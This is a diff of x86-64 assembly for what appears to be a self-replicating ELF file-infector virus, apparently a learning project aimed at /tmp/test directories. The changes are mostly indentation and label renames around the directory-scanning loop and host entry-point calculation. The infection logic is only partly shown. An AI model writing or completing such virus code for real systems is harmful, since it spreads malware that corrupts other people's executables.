@@ -168,10 +168,10 @@ _start:
 
     lea r15, [rel infect_directories]
     .open_directory:
-    .loop_condition:
-        mov rdi, [r15]
-        test rdi, rdi
-        jz _host
+        .loop_condition:
+            mov rdi, [r15]
+            test rdi, rdi
+            jz _host
 
         mov r14, rdi
 
@@ -182,9 +182,9 @@ _start:
 
         mov data(dir_fd), rax
 
-       lea rdi, [rel directory_msg]
-       mov rsi, 4
-       call write
+        lea rdi, [rel directory_msg]
+        mov rsi, 4
+        call write
     .read_directory:
         lea rdi, [rel read_directory_msg]
         mov rsi, 15
@@ -197,6 +197,7 @@ _start:
         syscall
         test rax, rax
         jle .close_directory
+
         xor r13, r13 ; offset counter for directory entries
         mov r12, rax ; number of bytes read by getdents
     .process_file:
@@ -411,7 +412,7 @@ do_infect:
 ; void *get_base_address()
 get_base_address:
     lea rax, [rel _start]
-    mov rdx, [rel virus_entry]
+    mov rdx, [rel virus_entrypoint]
     sub rax, rdx
     add rax, [rel host_entrypoint]
     ret
@@ -426,7 +427,7 @@ try_open:
     .error:
         jmp rcx
 
-; write (rdi=char*, rsi=len)
+; write(rdi=char*, rsi=len)
 write:
     push rdx
     push rsi
@@ -454,8 +455,6 @@ tmp_test:
     db "/tmp/test/", 0
 tmp_test2:
     db "/tmp/test2/", 0
-proc_self_exe:
-    db "/proc/self/exe", 0
 proc_self_maps:
     db "/proc/self/maps", 0
 not_64_bit_msg:
@@ -468,9 +467,9 @@ signature:
     db "abied-ch:ef082ac137069c1ef08f0a6d54ea4d2f4e180fb2769b9bb9f137cc5f98f5f4fe", 0
 infect_msg:
     db "infect", 10
-virus_entry:
+virus_entrypoint:
     dq _start
-host_entry:
+host_entrypoint:
     dq _host
 directory_msg:
     db "dir", 10
